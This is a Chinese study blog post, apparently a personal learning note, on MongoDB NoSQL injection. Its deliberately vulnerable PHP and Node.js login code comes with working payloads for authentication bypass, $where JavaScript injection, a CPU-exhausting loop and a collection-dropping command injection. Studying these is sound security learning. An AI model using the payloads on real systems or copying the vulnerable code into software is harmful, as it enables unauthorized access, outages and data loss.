@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="续上一篇mongodb注入的博客,其实大体差不多,新增了一些js的注入问题和driver的mongodb shell的命令执行问题,学习的参考链接 https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;97211 概述首先说下NOSQL的注入,NoSQL泛指非关系型数据库,相比传统的SQL数据库有更宽松的一致性限制,它通过减少关系约束和一致性检查来提供更好的性能和扩展性,但即使没有使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NOSQL注入学习">
+<meta property="og:url" content="http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="blacsheep&#39;s blog">
+<meta property="og:description" content="续上一篇mongodb注入的博客,其实大体差不多,新增了一些js的注入问题和driver的mongodb shell的命令执行问题,学习的参考链接 https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;97211 概述首先说下NOSQL的注入,NoSQL泛指非关系型数据库,相比传统的SQL数据库有更宽松的一致性限制,它通过减少关系约束和一致性检查来提供更好的性能和扩展性,但即使没有使用">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/2018/06/jsinjection.png">
+<meta property="article:published_time" content="2018-06-29T17:44:48.000Z">
+<meta property="article:modified_time" content="2023-07-10T02:13:29.460Z">
+<meta property="article:author" content="blacsheep">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/2018/06/jsinjection.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NOSQL注入学习</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/07/02/%E8%BD%AClinux%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/06/29/mangodb%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&text=NOSQL注入学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&title=NOSQL注入学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&is_video=false&description=NOSQL注入学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NOSQL注入学习&body=Check out this article: http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&title=NOSQL注入学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&title=NOSQL注入学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&title=NOSQL注入学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&title=NOSQL注入学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&name=NOSQL注入学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&t=NOSQL注入学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NoSQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">NoSQL注入分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%B8%AD%E7%9A%84NoSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">php中的NoSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E8%A8%80%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">重言注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">JavaScript注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#where%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">3.3.1.</span> <span class="toc-text">where操作符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Command%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.2.</span> <span class="toc-text">Command方法注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Node-js%E4%B8%AD%E7%9A%84NoSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">Node.js中的NoSQL注入</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        NOSQL注入学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">blacsheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-06-29T17:44:48.000Z" class="dt-published" itemprop="datePublished">2018-06-29</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web%E7%AF%87/">web篇</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>续上一篇mongodb注入的博客,其实大体差不多,新增了一些js的注入问题和driver的mongodb shell的命令执行问题,学习的参考链接 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/97211" title="https://www.anquanke.com/post/id/97211">https://www.anquanke.com/post/id/97211</a></p>
+<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>首先说下NOSQL的注入,NoSQL泛指非关系型数据库,相比传统的SQL数据库有更宽松的一致性限制,它通过减少关系约束和一致性检查来提供更好的性能和扩展性,但即使没有使用sql的语法,它们依然可以被攻击,而且由于NoSQL注入可以在程序语言中执行,而不是在声明式SQL语言中执行,所以潜在的影响要更大. NoSQL的调用是通过应用程序的语言来编写的,所以过滤掉常见的HTML特殊字符并不能阻止Nosql攻击 分类我们直接按传统sql分类来看吧</p>
+<h3 id="NoSQL注入分类"><a href="#NoSQL注入分类" class="headerlink" title="NoSQL注入分类"></a>NoSQL注入分类</h3><p>(1)永真式 也就是通过注入代码,让生成的表达式结果永远为真,从而绕过认证,可以脑补’or’1’&#x3D;’1 (2)联合查询 通过参数来改变查询的数据集来绕认证,脑补’ and false union select 1,md5(1)%23 (3)javascript注入 新的漏洞,由允许执行数据中的js的NoSQL数据库引入. js使得在数据引擎进行复杂事务和查询成为可能。传递不干净的用户输入可以注入js代码,导致非法数据获取</p>
+<h3 id="php中的NoSQL注入"><a href="#php中的NoSQL注入" class="headerlink" title="php中的NoSQL注入"></a>php中的NoSQL注入</h3><h4 id="重言注入"><a href="#重言注入" class="headerlink" title="重言注入"></a>重言注入</h4><p>拿文中代码为例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://mongo:27017&quot;</span>);</span><br><span class="line"><span class="variable">$dbUsername</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$dbPassword</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line"><span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">); </span><br><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line"><span class="variable">$doc_failed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;failed.html&quot;</span>);</span><br><span class="line"><span class="variable">$doc_succeed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;succeed.html&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一个简单的登录处理,data变量存在注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>
+
+<h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>随意看下,这个还是自由发挥吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string query =&quot;&#123; username: &#x27;&quot; + post_username + &quot;&#x27;, password: &#x27;&quot; + post_password + &quot;&#x27; &#125;&quot;</span><br><span class="line">payload:</span><br><span class="line"></span><br><span class="line">username=tolkien&#x27;, $or: [ &#123;&#125;, &#123; &#x27;a&#x27;:&#x27;a&amp;password=&#x27; &#125; ]</span><br></pre></td></tr></table></figure>
+
+<h4 id="JavaScript注入"><a href="#JavaScript注入" class="headerlink" title="JavaScript注入"></a>JavaScript注入</h4><h5 id="where操作符"><a href="#where操作符" class="headerlink" title="where操作符"></a>where操作符</h5><p>在mongodb中,where操作符是可以执行js语句的,Mongodb2.4之前的$where可以使用map-reduce,group来访问mongo shell中的全局变量和属性 给出示例代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://mongo:27017&quot;</span>);</span><br><span class="line"><span class="variable">$query_body</span> =<span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;$where&#x27;</span>=&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string">function q() </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    var username = &quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    var password = &quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;password&quot;</span>].<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    if(username == &#x27;admin&#x27;&amp;&amp;password == &#x27;123456&#x27;) </span></span><br><span class="line"><span class="string">        return true; </span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">        &#123; </span></span><br><span class="line"><span class="string">            return false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="variable">$query_body</span>);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line"><span class="variable">$doc_failed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;failed.html&quot;</span>);</span><br><span class="line"><span class="variable">$doc_succeed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;succeed.html&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们在这里注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：username=1&amp;password=1;return true;</span><br></pre></td></tr></table></figure>
+
+<p>查看数据流 <img src="/images/2018/06/jsinjection.png" alt="blacsheep"> php先将参数加到js里面,然后形成了一个奇奇怪怪的js,这个js返到mongodb里,然后在查询的时候,服务器执行了我们想要执行的js,从而绕过验证 然后文中一个让mongodb服务器cpu飙升的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&amp;password=1;(function()&#123;var%20date%20=%20new%20Date();%20do&#123;curDate%20=%20new%20Date();&#125;while(curDate-date%3C5000);%20return%20Math.max();&#125;)();</span><br></pre></td></tr></table></figure>
+
+<h5 id="Command方法注入"><a href="#Command方法注入" class="headerlink" title="Command方法注入"></a>Command方法注入</h5><p>php官方已经友情提示不要使用了,但还是难免有人为了实现奇怪的功能去使用,给出示例代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://mongo:27017&quot;</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Command</span>([</span><br><span class="line">// build the <span class="string">&#x27;distinct&#x27;</span> command</span><br><span class="line"><span class="string">&#x27;eval&#x27;</span>=&gt; <span class="string">&quot;db.users.distinct(&#x27;username&#x27;,&#123;&#x27;username&#x27;:&#x27;<span class="subst">$username</span>&#x27;&#125;)&quot;</span></span><br><span class="line">]);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeCommand</span>(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$cmd</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cursor</span>);</span><br><span class="line"><span class="variable">$doc_failed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;failed.html&quot;</span>);</span><br><span class="line"><span class="variable">$doc_succeed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;succeed.html&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>cmd那里存在拼接的Mongodb的shell执行,如果应用连接的数据库权限够高,我们可以干的事情就很多,比如可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:username=2′&#125;);db.users.drop();db.user.find(&#123;‘username’:’2</span><br></pre></td></tr></table></figure>
+
+<p>删库跑路了解一下</p>
+<h3 id="Node-js中的NoSQL注入"><a href="#Node-js中的NoSQL注入" class="headerlink" title="Node.js中的NoSQL注入"></a>Node.js中的NoSQL注入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="string">&#x27;mongodb://localhost/test&#x27;</span>, &#123; <span class="attr">useMongoClient</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">UserSchema</span> = <span class="keyword">new</span> mongoose.<span class="title class_">Schema</span>(&#123;</span><br><span class="line"><span class="attr">name</span>: <span class="title class_">String</span>,</span><br><span class="line"><span class="attr">username</span>: <span class="title class_">String</span>,</span><br><span class="line"><span class="attr">password</span>: <span class="title class_">String</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">User</span> = mongoose.<span class="title function_">model</span>(<span class="string">&#x27;users&#x27;</span>, <span class="title class_">UserSchema</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, __dirname);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;jade&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>()); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line"><span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123;<span class="attr">username</span>: req.<span class="property">body</span>.<span class="property">username</span>, <span class="attr">password</span>: req.<span class="property">body</span>.<span class="property">password</span>&#125;, <span class="keyword">function</span> (<span class="params">err, user</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user)</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">message</span>: err.<span class="property">message</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!user) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;Sorry!&#x27;</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;Welcome back &#x27;</span> + user.<span class="property">name</span> + <span class="string">&#x27;!!!&#x27;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">49090</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;listening on port %d&#x27;</span>, server.<span class="title function_">address</span>().<span class="property">port</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>打扰了,不会nodejs,虽然分析主要部分还是没啥问题的.. payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST http://127.0.0.1:49090/</span><br><span class="line">HTTP/1.1Content-Type: application/json&#123;</span><br><span class="line">&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;: null&#125;&#125;</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
